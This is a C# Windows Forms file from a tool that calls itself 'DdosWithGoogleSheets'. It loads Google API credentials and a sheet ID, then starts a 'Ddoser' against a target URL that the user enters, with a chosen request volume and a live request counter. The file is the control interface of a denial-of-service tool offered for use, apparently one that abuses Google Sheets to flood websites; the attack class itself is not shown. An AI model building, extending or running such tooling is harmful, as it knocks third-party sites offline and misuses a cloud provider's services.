using DdosUsingGoogleSheets;
using System.Reflection;

namespace DdosWithGoogleSheets
{
    public partial class Form1 : Form
    {
        bool isStarted = false;
        static readonly string fileName = "credentials.json";
        readonly Ddoser? _ddoser;

        public Form1()
        {
            try
            {
                if (!File.Exists(fileName))
                {
                    FindCredentials();
                }
                _ddoser = new Ddoser(Assembly.GetExecutingAssembly().GetName().Name, fileName);
            }
            catch (FileNotFoundException ex)
            {
                MessageBox.Show(ex.Message, "Credential File not found");
            }
            InitializeComponent();
        }

        private static void FindCredentials()
        {
            using var findCredentialsDialog = new OpenFileDialog()
            {
                InitialDirectory = "c:\\",
                Filter = "json file (*.json)|*.json",
                RestoreDirectory = true
            };
            if (findCredentialsDialog.ShowDialog() == DialogResult.OK)
            {
                var currentDirectory = Directory.GetCurrentDirectory();
                File.Copy(findCredentialsDialog.FileName, $"{currentDirectory}\\{fileName}", true);
            }
        }

        private async void StartButton_Click(object sender, EventArgs e)
        {
            string sheetId;
            if (!File.Exists("list_id.txt"))
            {
                StartMessageForm();
                return;
            }
            using (var fileStream = new StreamReader("list_id.txt"))
            {
                sheetId = fileStream.ReadToEnd();
            }
            if (!isStarted)
            {
                if (_ddoser == null)
                {
                    MessageBox.Show("Зарегестрируйте credentials.json", "Авторизация не прошла");
                    return;
                }

                await DoDDOS(sheetId);
            }
        }

        private async Task DoDDOS(string sheetId)
        {
            isStarted = true;
            StartButton.Enabled = false;
            RequestCounterTimer.Enabled = true;

            try
            {
                await _ddoser!.Start((int)numericUpDown1.Value, textBox1.Text, sheetId);
            }
            catch (ArgumentException ex)
            {
                MessageBox.Show(ex.Message, "URI некорректен");
            }
            catch (LimitException)
            {
                MessageBox.Show("Api вызвало исключение, попробуйте ещё раз через 100 секунд", "Превышен лимит запросов");
            }

            RequestCounterTimer.Enabled = false;
            
            StartButton.Enabled = true;
            isStarted = false;
        }

        private void UpdateCredentials_Click(object sender, EventArgs e)
        {
            try
            {
                FindCredentials();
            }
            catch (FileNotFoundException ex)
            {
                MessageBox.Show(ex.Message, "Credential File not found");
            }
        }

        private void RequestCounterTimer_Tick(object sender, EventArgs e)
        {
            LabelRequestCount.Text = _ddoser?.Counter.ToString() ?? "0";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            StartMessageForm();
        }

        private static void StartMessageForm()
        {
            Form newForm = new MessageForm();
            newForm.ShowDialog();
        }
    }
}